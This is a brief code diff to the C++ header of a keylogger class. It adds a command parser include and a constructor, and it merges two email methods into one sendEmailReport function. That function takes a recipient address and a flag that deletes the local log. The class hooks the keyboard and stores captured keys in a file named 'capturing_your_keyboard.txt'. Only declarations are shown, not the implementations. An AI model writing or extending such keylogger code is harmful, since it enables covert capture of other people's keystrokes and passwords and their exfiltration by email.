@@ -3,6 +3,7 @@
 #include "EmailService.h"
 #include "Hook.h"
 #include "StringUtilities.h"
+#include "CommandParser.h"
 
 #include <fstream>
 #include <vector>
@@ -14,12 +15,12 @@
 
 class Keylogger {
 public:
+	Keylogger();
 	void start();
 	void stop();
 	~Keylogger();
 
-	bool sendEmailCallback(std::string emailTo);
-	bool sendEmailReport(bool deleteLocal);
+	bool sendEmailReport(std::string emailTo, bool deleteLocal);
 private:
 	const wstring FILENAME = L"capturing_your_keyboard.txt";
 	shared_ptr<Hook> hook;
